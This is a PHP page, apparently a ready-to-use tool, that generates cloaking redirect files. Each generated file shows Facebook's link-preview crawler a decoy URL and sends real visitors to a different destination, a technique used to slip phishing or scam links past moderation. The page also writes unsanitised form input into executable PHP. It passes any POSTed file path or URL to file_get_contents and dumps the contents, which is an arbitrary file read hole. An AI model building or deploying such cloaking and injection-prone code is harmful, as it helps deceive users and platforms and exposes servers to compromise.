<?php session_start(); /* Starts the session */

if(!isset($_SESSION['UserData']['Username'])){
    header("location:index.php");
    exit;
}



?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <style type="text/css">
        @import "bourbon";

    body {
        background: #eee !important;
    }

    .wrapper {
        margin-top: 80px;
      margin-bottom: 80px;
    }

    .form-signin {
      max-width: 380px;
      padding: 15px 35px 45px;
      margin: 0 auto;
      background-color: #fff;
      border: 1px solid rgba(0,0,0,0.1);

      .form-signin-heading,
        .checkbox {
          margin-bottom: 30px;
        }

    .checkbox {
      font-weight: normal;
    }

    .form-control {
      position: relative;
      font-size: 16px;
      height: auto;
      padding: 10px;
        @include box-sizing(border-box);

        &:focus {
          z-index: 2;
        }
    }

    input[type="text"] {
      margin-bottom: -1px;
      border-bottom-left-radius: 0;
      border-bottom-right-radius: 0;
    }

    input[type="password"] {
      margin-bottom: 20px;
      border-top-left-radius: 0;
      border-top-right-radius: 0;
    }
}

    </style>
</head>
<body>
    <div class="container">
    <form action="" method="post">
    <label>Fake link:</label>
    <input class="form-control" type="text" name="fake_link" id="textbox"/> </br>
    <label>Địa chỉ Đến:</label>
    <input class="form-control" type="text" name="url" id="textbox"/> </br>
    <input type="submit" value="Fake" class="btn btn-lg btn-primary"/></br>
    <br>
    </form>
    <?php
    error_reporting(0);
    if($_POST["url"]){
    // $n=rand(0000,9999);
    $pathname = substr(md5(microtime()),rand(0,26),10);
    $filePhp = $pathname.".php";

    $fakeLink = $_POST['fake_link'];
    if (($_POST['fake_link']) == '') {
      $fakeLink = 'http://'.$_SERVER['HTTP_HOST'].'/'.$fileHtml;
    }
    $fphp = fopen($filePhp,'w');

    $phpString = '
<?php
if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/") !== false ||
    strpos($_SERVER["HTTP_USER_AGENT"], "Facebot") !== false
) {
header("Location: '.$_POST['fake_link'].'", true, 301);
exit;
}
else {
header("Location: '.$_POST['url'].'", true, 301);
exit;
}
?>
';

    fwrite($fphp,$phpString);
    fclose($fphp);
    echo "Link share: " . "<a href ='$filePhp'>" . $filePhp . "</a>";
    }
    ?>

    <br><br>
<?php
if(isset($_POST['file'])) {
    $loadFile = file_get_contents($_POST['file']);
    var_dump($loadFile);
}
?>
<!-- <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
<textarea name="update" rows="20" cols="70">
    <?php echo file_get_contents($data);?>
    </textarea>
    <br>
    <input type="submit" value="Update" class="btn btn-lg btn-primary"/></br>
    <br>
</form>
    </div>
</body>
</html> -->

